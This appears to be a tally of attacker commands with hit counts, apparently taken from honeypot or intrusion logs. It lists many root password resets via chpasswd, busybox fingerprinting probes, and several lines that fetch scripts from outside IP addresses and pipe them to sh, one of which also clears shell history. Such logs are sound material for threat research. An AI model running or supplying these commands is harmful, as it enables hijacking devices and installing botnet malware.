#  'tftp; wget; /bin/busybox QAHSV': 1,
#  '/bin/busybox QAHSV': 1,
#  'echo "root:lSwPiEBul0Hq"|chpasswd|bash': 1,
#  'echo "root:TIgKHEl2Xp9z"|chpasswd|bash': 2,
#  'echo "root:hbtbh1NmQkEf"|chpasswd|bash': 2,
#  'echo "root:mchAN53SAzVG"|chpasswd|bash': 2,
#  'echo "root:C21Pc0EDZGWn"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox DMRJT': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DMRJT': 1,
#  'tftp; wget; /bin/busybox DMRJT': 1,
#  '/bin/busybox DMRJT': 1,
#  'echo "root:KRUEKMDC7igz"|chpasswd|bash': 1,
#  'echo "root:vjPKZ7rEjNlP"|chpasswd|bash': 1,
#  'echo "root:useSfWfnKKu5"|chpasswd|bash': 3,
#  'echo "root:ZL4zsLkkBPK7"|chpasswd|bash': 1,
#  'echo "root:NXnZ30tVsbW9"|chpasswd|bash': 1,
#  'echo "root:VvMcuLcy1Gl7"|chpasswd|bash': 2,
#  'echo "root:qvWfz0haL6mR"|chpasswd|bash': 1,
#  'echo "root:W4JpSDcxFiRN"|chpasswd|bash': 1,
#  'echo "root:QlHlKOGSwPkk"|chpasswd|bash': 1,
#  'echo "root:EC01vGZjH67z"|chpasswd|bash': 2,
#  'echo "root:o5Sx9pxVXLMu"|chpasswd|bash': 1,
#  'echo "root:KtMO5JlyvAEK"|chpasswd|bash': 1,
#  'echo "root:nnOwsY8hFVkk"|chpasswd|bash': 1,
#  'echo "root:zi4SisDDh4xg"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox UZJOO': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UZJOO': 1,
#  'tftp; wget; /bin/busybox UZJOO': 1,
#  '/bin/busybox UZJOO': 1,
#  'echo "root:Dkf8ZP4nincs"|chpasswd|bash': 1,
#  'echo "root:5jEVLcukDBsV"|chpasswd|bash': 3,
#  'echo "root:2TejUuTYIYLN"|chpasswd|bash': 2,
#  'echo "root:HP8TumJA6g8V"|chpasswd|bash': 1,
#  'echo "root:LwJyWpbKEk3s"|chpasswd|bash': 1,
#  'echo "root:2FSsOln5sBPT"|chpasswd|bash': 1,
#  'echo "root:eiYYp84nDxPb"|chpasswd|bash': 1,
#  'echo "root:NIcHGQZzfmBr"|chpasswd|bash': 1,
#  'echo "root:SXOKJ1o6j3tW"|chpasswd|bash': 1,
#  'echo "root:C0YUgsQjk5ZV"|chpasswd|bash': 1,
#  'echo "root:G0WAAevfIgJb"|chpasswd|bash': 1,
#  'echo "root:2QYvtzGiUBRJ"|chpasswd|bash': 1,
#  'echo "root:xNylYy7Jjb1D"|chpasswd|bash': 2,
#  'echo "root:sIDu8lK3g7By"|chpasswd|bash': 2,
#  'echo "root:I3gWuaHyZAiX"|chpasswd|bash': 1,
#  'echo "root:OBikoasCP4kQ"|chpasswd|bash': 2,
#  'echo "root:lPoNwCDLCdKm"|chpasswd|bash': 2,
#  'echo "root:iZrZjRm07FOT"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox ICSSQ': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ICSSQ': 1,
#  'tftp; wget; /bin/busybox ICSSQ': 1,
#  '/bin/busybox ICSSQ': 1,
#  'echo "root:8swHojUSIDTr"|chpasswd|bash': 1,
#  'echo "root:eqUhZCY5QlwD"|chpasswd|bash': 2,
#  'echo "root:jotfIamSYMVP"|chpasswd|bash': 1,
#  'echo "root:tdBIFbGExZR5"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox IHXZA': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox IHXZA': 1,
#  'tftp; wget; /bin/busybox IHXZA': 1,
#  '/bin/busybox IHXZA': 1,
#  'echo "root:A1GFmS1TfV0u"|chpasswd|bash': 2,
#  'echo "root:VGhYya3JlQ4k"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox KYEBY': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox KYEBY': 1,
#  'tftp; wget; /bin/busybox KYEBY': 1,
#  '/bin/busybox KYEBY': 1,
#  'cat /proc/mounts; /bin/busybox MIQDI': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MIQDI': 1,
#  'tftp; wget; /bin/busybox MIQDI': 1,
#  '/bin/busybox MIQDI': 1,
#  'echo "root:umDuIqfxkU90"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox DQNOG': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DQNOG': 1,
#  'tftp; wget; /bin/busybox DQNOG': 1,
#  '/bin/busybox DQNOG': 1,
#  'cat /proc/mounts; /bin/busybox VXJDN': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox VXJDN': 1,
#  'tftp; wget; /bin/busybox VXJDN': 1,
#  '/bin/busybox VXJDN': 1,
#  'cat /proc/mounts; /bin/busybox TMTBV': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TMTBV': 1,
#  'tftp; wget; /bin/busybox TMTBV': 1,
#  '/bin/busybox TMTBV': 1,
#  'echo "root:akC6diBRMzS7"|chpasswd|bash': 1,
#  'uname -s -m': 9,
#  'echo "root:b4tPXjMiqSYE"|chpasswd|bash': 1,
#  'echo "root:PeLXGnFuzrma"|chpasswd|bash': 3,
#  'echo "root:MJb2rvahKUnL"|chpasswd|bash': 1,
#  'echo "root:BTuXjpCh9KLq"|chpasswd|bash': 1,
#  'echo "root:cl0yY0yuSlZd"|chpasswd|bash': 1,
#  'echo "root:V8ugZ5s7R2IG"|chpasswd|bash': 2,
#  'echo "root:FMiky9owozTE"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox CYHSL': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox CYHSL': 1,
#  'tftp; wget; /bin/busybox CYHSL': 1,
#  '/bin/busybox CYHSL': 1,
#  'echo "root:iXHOqHFWa0B9"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox EFMLW': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox EFMLW': 1,
#  'tftp; wget; /bin/busybox EFMLW': 1,
#  '/bin/busybox EFMLW': 1,
#  'echo "root:EqXE0cpbuGKe"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox WSKCK': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WSKCK': 1,
#  'tftp; wget; /bin/busybox WSKCK': 1,
#  '/bin/busybox WSKCK': 1,
#  'echo "root:NnMb547oGNad"|chpasswd|bash': 1,
#  'echo "root:ISUURdXcdDCo"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox GTWYV': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GTWYV': 1,
#  'tftp; wget; /bin/busybox GTWYV': 1,
#  '/bin/busybox GTWYV': 1,
#  'echo "root:3e5as2YAhfVk"|chpasswd|bash': 2,
#  'echo "root:45JLDaOQCE5z"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox JYTFY': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JYTFY': 1,
#  'tftp; wget; /bin/busybox JYTFY': 1,
#  '/bin/busybox JYTFY': 1,
#  'echo "root:J0hTtUyjU151"|chpasswd|bash': 1,
#  'echo "root:JGbrgF4h3UNr"|chpasswd|bash': 1,
#  'echo "root:s6MQVXFY44Hm"|chpasswd|bash': 1,
#  'echo "root:VFCywUdZz65b"|chpasswd|bash': 1,
#  'echo "root:VQijZ24mFRvc"|chpasswd|bash': 1,
#  'echo "root:5VvMtQ8CdRoc"|chpasswd|bash': 1,
#  'echo "root:w4UzHq1Czd9G"|chpasswd|bash': 2,
#  'echo "root:T0afnqrH0Iv4"|chpasswd|bash': 1,
#  'echo "root:vjuEpXJHz7N9"|chpasswd|bash': 1,
#  'echo "root:cuwoAKMs6dZl"|chpasswd|bash': 2,
#  'echo "root:M3cWBI0Fmmdg"|chpasswd|bash': 2,
#  'echo "root:XE0WA0EmcU8U"|chpasswd|bash': 1,
#  'echo "root:RNygKvxiLsBI"|chpasswd|bash': 1,
#  'echo "root:YLbqQW6K9uAM"|chpasswd|bash': 2,
#  'echo "root:cUFBUjz1don7"|chpasswd|bash': 1,
#  'echo "root:JY9ZpvRhhZmZ"|chpasswd|bash': 1,
#  'echo "root:l66B9NtDaTJ3"|chpasswd|bash': 1,
#  'echo "root:EKxXjIsI8ni9"|chpasswd|bash': 1,
#  '#!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://125.27.179.36/scripts/23s; curl -O http://125.27.179.36/scripts/23s; chmod +x 23s; ./23s; wget http://125.27.179.36/scripts/23; curl -O http://125.27.179.36/scripts/23; chmod +x 23; ./23; rm -rf 23.sh; history -c; ': 66,
#  '/bin/eyshcjdmzg': 57,
#  'ls -la /var/run/gcc.pid': 56,
#  'echo "root:m9B1thX3Wdiz"|chpasswd|bash': 1,
#  'echo "root:0JyelWGUJ1aF"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox TGIDU': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TGIDU': 1,
#  'tftp; wget; /bin/busybox TGIDU': 1,
#  '/bin/busybox TGIDU': 1,
#  'echo "root:f0q0STJzyw8z"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox CTWWO': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox CTWWO': 1,
#  'tftp; wget; /bin/busybox CTWWO': 1,
#  '/bin/busybox CTWWO': 1,
#  'echo "root:F0MiFgQHbWtF"|chpasswd|bash': 1,
#  'echo "root:ve8wQIbHEw2R"|chpasswd|bash': 1,
#  'echo "root:ZEgloJUkdoC2"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox BMMJJ': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BMMJJ': 1,
#  'tftp; wget; /bin/busybox BMMJJ': 1,
#  '/bin/busybox BMMJJ': 1,
#  'echo "root:gZ5Fj8fZg4tG"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox KDGFO': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox KDGFO': 1,
#  'tftp; wget; /bin/busybox KDGFO': 1,
#  '/bin/busybox KDGFO': 1,
#  'echo "root:o6WhxmATmLhl"|chpasswd|bash': 1,
#  'echo "root:Ul74EvR1uqQw"|chpasswd|bash': 2,
#  'echo "root:v6d03GYviZ66"|chpasswd|bash': 1,
#  'echo "root:bESFHmJpPjjY"|chpasswd|bash': 2,
#  'echo "root:vu0zNnVn1qPF"|chpasswd|bash': 2,
#  'echo "root:O6tRyVHA7c4l"|chpasswd|bash': 1,
#  'echo "root:tNFpSmc3iixA"|chpasswd|bash': 2,
#  'echo "root:BpEenZdpm7K5"|chpasswd|bash': 1,
#  'echo "root:eFopcYeBXX5q"|chpasswd|bash': 1,
#  'echo "root:Qhuu8zbaFBwn"|chpasswd|bash': 1,
#  'echo "root:rK6KnNsh5ShO"|chpasswd|bash': 1,
#  'echo "root:D4gRA3bVSi5S"|chpasswd|bash': 3,
#  'echo "root:jOMTytCfBc6T"|chpasswd|bash': 1,
#  'echo "root:LjtoOoU2EbCY"|chpasswd|bash': 1,
#  'echo "root:XIxGl2YSvUit"|chpasswd|bash': 2,
#  'echo "root:FiLHS5RvPB95"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox LJMGZ': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox LJMGZ': 1,
#  'tftp; wget; /bin/busybox LJMGZ': 1,
#  '/bin/busybox LJMGZ': 1,
#  'echo "root:aZnyVIUKWbgQ"|chpasswd|bash': 2,
#  'echo "root:IZ4tbpIQIn2w"|chpasswd|bash': 2,
#  'echo "root:CdwN9ZGB1F88"|chpasswd|bash': 1,
#  'echo "root:FKRutzoOJGtG"|chpasswd|bash': 2,
#  'echo "root:zKwfnztVxHQ4"|chpasswd|bash': 1,
#  'echo "root:2sXY9TlwjdRI"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox HVUQQ': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox HVUQQ': 1,
#  'tftp; wget; /bin/busybox HVUQQ': 1,
#  '/bin/busybox HVUQQ': 1,
#  'echo "root:kld7Aua1ieG6"|chpasswd|bash': 1,
#  'echo "root:b44VZWy9eLWv"|chpasswd|bash': 2,
#  'echo "root:8oSC3PUB5Whz"|chpasswd|bash': 2,
#  'echo "root:XWpkTSzaUFk1"|chpasswd|bash': 2,
#  'echo "root:ibGNZZjdjffM"|chpasswd|bash': 2,
#  'echo "root:4Q1liSNl4us6"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox GHPCO': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GHPCO': 1,
#  'tftp; wget; /bin/busybox GHPCO': 1,
#  '/bin/busybox GHPCO': 1,
#  'echo "root:0oAQUX7D1Oxc"|chpasswd|bash': 2,
#  'echo "root:tJobqrIK6Osp"|chpasswd|bash': 1,
#  'echo "root:3bulgmAQXCrJ"|chpasswd|bash': 2,
#  'echo "root:xQMJdqex02Ol"|chpasswd|bash': 1,
#  'echo "root:e0H6EURVpD1B"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox BSEIM': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BSEIM': 1,
#  'tftp; wget; /bin/busybox BSEIM': 1,
#  '/bin/busybox BSEIM': 1,
#  'echo "root:tKXk0Umq8QCv"|chpasswd|bash': 1,
#  'echo "root:WijDvJTpDaa5"|chpasswd|bash': 1,
#  'echo "root:tsALpo96E9n2"|chpasswd|bash': 2,
#  'echo "root:Qtk0jmQ6hrkr"|chpasswd|bash': 2,
#  'echo "root:y53G2awTt5JP"|chpasswd|bash': 1,
#  'echo "root:uQhnPU2fY8fz"|chpasswd|bash': 1,
#  'echo "root:5t3thQtOwRuF"|chpasswd|bash': 2,
#  'echo "root:usNUZowoS9wX"|chpasswd|bash': 1,
#  'echo "root:H53T3X2sng5f"|chpasswd|bash': 1,
#  'echo "root:79woQIWKE9eV"|chpasswd|bash': 1,
#  'echo "root:WlO7AmEWN0VR"|chpasswd|bash': 1,
#  'echo "root:LoFSNOGLkcay"|chpasswd|bash': 1,
#  'echo "root:i4zK3QBJK7py"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox XOIVJ': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox XOIVJ': 1,
#  'tftp; wget; /bin/busybox XOIVJ': 1,
#  '/bin/busybox XOIVJ': 1,
#  'echo "root:wFMHcC0sU0cP"|chpasswd|bash': 1,
#  'echo "root:8W8wzQfuIGYT"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox ZTRFO': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZTRFO': 1,
#  'tftp; wget; /bin/busybox ZTRFO': 1,
#  '/bin/busybox ZTRFO': 1,
#  'cat /proc/mounts; /bin/busybox DXKLO': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DXKLO': 1,
#  'tftp; wget; /bin/busybox DXKLO': 1,
#  '/bin/busybox DXKLO': 1,
#  'echo "root:eopIGhkfQjuC"|chpasswd|bash': 1,
#  'echo "root:hCNGy8TyVxZU"|chpasswd|bash': 1,
#  'echo "root:LT7eybQWQhzR"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox SDWOA': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SDWOA': 1,
#  'tftp; wget; /bin/busybox SDWOA': 1,
#  '/bin/busybox SDWOA': 1,
#  'echo "root:cvyhZOSkL0VJ"|chpasswd|bash': 1,
#  'echo "root:SNWtCSoXNYsU"|chpasswd|bash': 2,
#  'echo "root:qvntlcbLl2Jk"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox YPNEH': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YPNEH': 1,
#  'tftp; wget; /bin/busybox YPNEH': 1,
#  '/bin/busybox YPNEH': 1,
#  'echo "root:1CFdDhpo5TUB"|chpasswd|bash': 3,
#  'echo "root:9nHlzGWxn856"|chpasswd|bash': 3,
#  'echo "root:qepCkhMLugOf"|chpasswd|bash': 1,
#  'echo "root:6vqSsIB28jz5"|chpasswd|bash': 2,
#  'echo "root:XZyhecRuO6P6"|chpasswd|bash': 1,
#  'echo "root:tT8JliUiWQBo"|chpasswd|bash': 1,
#  'echo "root:Zyr7oJxrifsV"|chpasswd|bash': 2,
#  'echo "root:MvSIbav97U6p"|chpasswd|bash': 3,
#  'echo "root:Y0m8dqnFKwXV"|chpasswd|bash': 1,
#  'echo "root:boelZ0zeQjp9"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox TRNQU': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TRNQU': 1,
#  'tftp; wget; /bin/busybox TRNQU': 1,
#  '/bin/busybox TRNQU': 1,
#  'echo "root:z2fnaeySV0tQ"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox KNYWX': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox KNYWX': 1,
#  'tftp; wget; /bin/busybox KNYWX': 1,
#  '/bin/busybox KNYWX': 1,
#  'cat /proc/mounts; /bin/busybox DBFTP': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DBFTP': 1,
#  'tftp; wget; /bin/busybox DBFTP': 1,
#  '/bin/busybox DBFTP': 1,
#  'echo "root:a2MV3SAQcTUB"|chpasswd|bash': 1,
#  'echo "root:2hsJDeeKSYrW"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox USZHJ': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox USZHJ': 1,
#  'tftp; wget; /bin/busybox USZHJ': 1,
#  '/bin/busybox USZHJ': 1,
#  'cat /proc/mounts; /bin/busybox TKXRG': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TKXRG': 1,
#  'tftp; wget; /bin/busybox TKXRG': 1,
#  '/bin/busybox TKXRG': 1,
#  'echo "root:Erz0J7bwZaSq"|chpasswd|bash': 1,
#  'echo "root:LwsxluoI7qCd"|chpasswd|bash': 1,
#  'echo "root:k7kCtuxZwPIt"|chpasswd|bash': 2,
#  'echo "root:9Sw2j8ZUyzEm"|chpasswd|bash': 1,
#  'echo "root:aBpwNZPlRVqj"|chpasswd|bash': 1,
#  'echo "root:EyO3G1GfMa4L"|chpasswd|bash': 1,
#  'echo "root:wsmiKlYtYIgx"|chpasswd|bash': 1,
#  'echo "root:OO94nR452K3u"|chpasswd|bash': 1,
#  'echo "root:oq5OFloLdzAI"|chpasswd|bash': 1,
#  'echo "root:oPIjeACF5si6"|chpasswd|bash': 1,
#  'echo "root:wCbM7nkGsJds"|chpasswd|bash': 1,
#  'echo "root:flCaLA7Oy6xd"|chpasswd|bash': 4,
#  'echo "root:pfpPRMnvA7FZ"|chpasswd|bash': 3,
#  'echo "root:Tx7mapRM4g8X"|chpasswd|bash': 1,
#  'echo "root:z6s2HbHtYVLK"|chpasswd|bash': 1,
#  'echo "root:kBPw56ZtoOWB"|chpasswd|bash': 2,
#  'echo "root:6Dtaxxf8vWXM"|chpasswd|bash': 1,
#  'echo "root:DlQd6HnFrzzo"|chpasswd|bash': 1,
#  'echo "root:KcLvcKRozVMV"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox RWHTM': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RWHTM': 1,
#  'tftp; wget; /bin/busybox RWHTM': 1,
#  '/bin/busybox RWHTM': 1,
#  'echo "root:hN5nHBKCx5sj"|chpasswd|bash': 1,
#  'echo "root:0O4WApecNoUj"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox RAIGP': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RAIGP': 1,
#  'tftp; wget; /bin/busybox RAIGP': 1,
#  '/bin/busybox RAIGP': 1,
#  'echo "root:ANwKnITIKi3B"|chpasswd|bash': 1,
#  'echo "root:VRY0OmMEPwnH"|chpasswd|bash': 1,
#  'echo "root:5TEFifvuBOBn"|chpasswd|bash': 1,
#  'echo "root:6ll8LQ9wqfg4"|chpasswd|bash': 1,
#  'echo "root:tQUBmdO5vUXD"|chpasswd|bash': 1,
#  'echo "root:VQ04kNcxifBW"|chpasswd|bash': 1,
#  'echo "root:EnYacfARit9m"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox UFJXB': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UFJXB': 1,
#  'tftp; wget; /bin/busybox UFJXB': 1,
#  '/bin/busybox UFJXB': 1,
#  'echo "root:bC6CzuMR6BrJ"|chpasswd|bash': 1,
#  'echo "root:at4T9rvWonbo"|chpasswd|bash': 1,
#  'echo "root:5uoJrqXH9kVs"|chpasswd|bash': 1,
#  'echo "root:y26kzOiAo1le"|chpasswd|bash': 1,
#  'echo "root:pA3MOS50wcxX"|chpasswd|bash': 1,
#  'echo "root:9f6hiP1Y2KG8"|chpasswd|bash': 2,
#  'echo "root:hjScsfZ5GMIf"|chpasswd|bash': 2,
#  'echo "root:uV6lTylNOY0p"|chpasswd|bash': 1,
#  'echo "root:YXOiirpWjuie"|chpasswd|bash': 1,
#  'echo "root:HAQBqwEATm4S"|chpasswd|bash': 1,
#  'echo "root:iO7Z9zpbfQIA"|chpasswd|bash': 1,
#  'echo "root:P4oB4tldemGb"|chpasswd|bash': 2,
#  'echo "root:wRMzEaXtWjC9"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox OYVQD': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox OYVQD': 1,
#  'tftp; wget; /bin/busybox OYVQD': 1,
#  '/bin/busybox OYVQD': 1,
#  'echo "root:ZLoaE70z6VfB"|chpasswd|bash': 1,
#  'echo "root:jxmTkhHL7x4f"|chpasswd|bash': 1,
#  'echo "root:WTbnju5Trijw"|chpasswd|bash': 1,
#  'echo "root:txDA5QtRQjqv"|chpasswd|bash': 1,
#  'echo "root:5JI7rpDxoMVQ"|chpasswd|bash': 2,
#  'echo "root:CIosAM3HeI1i"|chpasswd|bash': 1,
#  'echo "root:LHziRsotAZvW"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox XNEZO': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox XNEZO': 1,
#  'tftp; wget; /bin/busybox XNEZO': 1,
#  '/bin/busybox XNEZO': 1,
#  'echo "root:u2Glr1QmOsxG"|chpasswd|bash': 2,
#  'echo "root:AZ7uJL2ltfxE"|chpasswd|bash': 3,
#  'echo "root:0Ihzx68QiwQF"|chpasswd|bash': 1,
#  'echo "root:dvQYhu1APp9w"|chpasswd|bash': 2,
#  'echo "root:RhjSBJXrL5SZ"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox GGIVR': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GGIVR': 1,
#  'tftp; wget; /bin/busybox GGIVR': 1,
#  '/bin/busybox GGIVR': 1,
#  'echo "root:s63ooTCPuCTT"|chpasswd|bash': 2,
#  'echo "root:4Z3Nf6e8Nics"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox OXCNH': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox OXCNH': 1,
#  'tftp; wget; /bin/busybox OXCNH': 1,
#  '/bin/busybox OXCNH': 1,
#  'echo "root:AbeEAxaB4Kyi"|chpasswd|bash': 1,
#  'echo "root:DO8ccxBuoktT"|chpasswd|bash': 1,
#  'echo "root:bdNQjo3bp5zu"|chpasswd|bash': 3,
#  'echo "root:LjRf4wgVciz5"|chpasswd|bash': 1,
#  'wget -qO - http://92.207.203.157/x/1sh | sh > /dev/null 2>&1 &': 72,
#  'rm -rf /var/run/1sh; wget -c http://92.207.203.157/x/1sh -P /var/run && sh /var/run/1sh &': 70,
#  'wget -qO - http://92.207.203.157/x/2sh | sh > /dev/null 2>&1 &': 58,
#  'rm -rf /tmp/2sh; wget -c http://92.207.203.157/x/2sh -P /tmp && sh /tmp/2sh &': 51,
#  'curl http://92.207.203.157/x/3sh | sh': 46,
#  'cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &': 43,
#  'echo "root:P9PjCnyecr2Y"|chpasswd|bash': 1,
#  'echo "root:6s009LmkLcFl"|chpasswd|bash': 1,
#  'echo "root:INImYpdMrZDh"|chpasswd|bash': 2,
#  'echo "root:pz4JcjmHM0aL"|chpasswd|bash': 1,
#  'echo "root:FCaR5vsJsylH"|chpasswd|bash': 1,
#  'echo "root:K2BQYYtvOgz8"|chpasswd|bash': 1,
#  'echo "root:plOqeOgTJwvv"|chpasswd|bash': 1,
#  'echo "root:0BMVKAWgu5k3"|chpasswd|bash': 1,
#  'echo "root:NG6rvgjTcfoE"|chpasswd|bash': 2,
#  'echo "root:oPPA4pL0bbml"|chpasswd|bash': 1,
#  'echo "root:gWkoWbmE3GLY"|chpasswd|bash': 1,
#  'echo "root:n78xAci02kS6"|chpasswd|bash': 1,
#  'echo "root:c3f3p4DTjYkc"|chpasswd|bash': 1,
#  'echo "root:Qlb8d2fi00SF"|chpasswd|bash': 1,
#  'echo "root:SnpcG57NfJg7"|chpasswd|bash': 2,
#  'echo "root:bDxG4Ag5Lgag"|chpasswd|bash': 1,
#  'echo "root:qzz1yll1X0Ym"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox JBUNI': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JBUNI': 1,
#  'tftp; wget; /bin/busybox JBUNI': 1,
#  '/bin/busybox JBUNI': 1,
#  'echo "root:dGFdPFpQzCnC"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox KYYDN': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox KYYDN': 1,
#  'tftp; wget; /bin/busybox KYYDN': 1,
#  '/bin/busybox KYYDN': 1,
#  'echo "root:XH76Qbgz3NXL"|chpasswd|bash': 1,
#  'echo "root:gCPChbBcHVV3"|chpasswd|bash': 1,
#  'echo "root:snU8KcUqoJlB"|chpasswd|bash': 1,
#  'echo "root:D9FQqImqWtgP"|chpasswd|bash': 1,
#  'echo "root:U6xN5nCYm8ep"|chpasswd|bash': 1,
#  'echo "root:084CDEDebIkZ"|chpasswd|bash': 2,
#  'echo "root:RDL6mI4PRizj"|chpasswd|bash': 1,
#  'echo "root:RMibJEZS8Wqw"|chpasswd|bash': 2,
#  'echo "root:DnCsYFcJEqEm"|chpasswd|bash': 1,
#  'echo "root:mGx92vJZPcvm"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox FYPXB': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox FYPXB': 1,
#  'tftp; wget; /bin/busybox FYPXB': 1,
#  '/bin/busybox FYPXB': 1,
#  'echo "root:CF1U7h44m2aq"|chpasswd|bash': 1,
#  'echo "root:bnQEeMrQ2S29"|chpasswd|bash': 1,
#  'echo "root:gavS1R0c35t2"|chpasswd|bash': 1,
#  'help': 229,
#  'busybox': 229,
#  'echo "root:suco1NVNTJns"|chpasswd|bash': 1,
#  'echo "root:wJ64J6hFf0uz"|chpasswd|bash': 1,
#  'echo "root:ACUIr1kO3Xhp"|chpasswd|bash': 2,
#  'echo "root:FCAzJgHymD6N"|chpasswd|bash': 1,
#  'echo "root:djbzhdpUiXUj"|chpasswd|bash': 1,
#  'echo "root:UGi8qKMjtnGu"|chpasswd|bash': 2,
#  'echo "root:8XHXp5EDNlx3"|chpasswd|bash': 1,
#  'echo "root:QGQwJAQZidqN"|chpasswd|bash': 1,
#  'echo "root:G3DSRixbv7y1"|chpasswd|bash': 1,
#  'echo "root:SpKHmKKM68VF"|chpasswd|bash': 1,
#  'echo "root:RXJNYas3gJpw"|chpasswd|bash': 1,
#  'echo "root:4gWHeXXKshVg"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox XCWVF': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox XCWVF': 1,
#  'tftp; wget; /bin/busybox XCWVF': 1,
#  '/bin/busybox XCWVF': 1,
#  'echo "root:BabfkZljBvFz"|chpasswd|bash': 1,
#  'echo "root:WIlhEUD2hnCB"|chpasswd|bash': 1,
#  'echo "root:9I6RFdbLukcg"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox IUDWI': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox IUDWI': 1,
#  'tftp; wget; /bin/busybox IUDWI': 1,
#  '/bin/busybox IUDWI': 1,
#  'echo "root:kl7qQ64C7Wk1"|chpasswd|bash': 1,
#  'echo "root:Zhv7vNY8lv97"|chpasswd|bash': 3,
#  'echo "root:yhJMFF8npddK"|chpasswd|bash': 1,
#  'echo "root:8qtkXhcTyP7u"|chpasswd|bash': 1,
#  'echo "root:jGvNepfUPPQ3"|chpasswd|bash': 1,
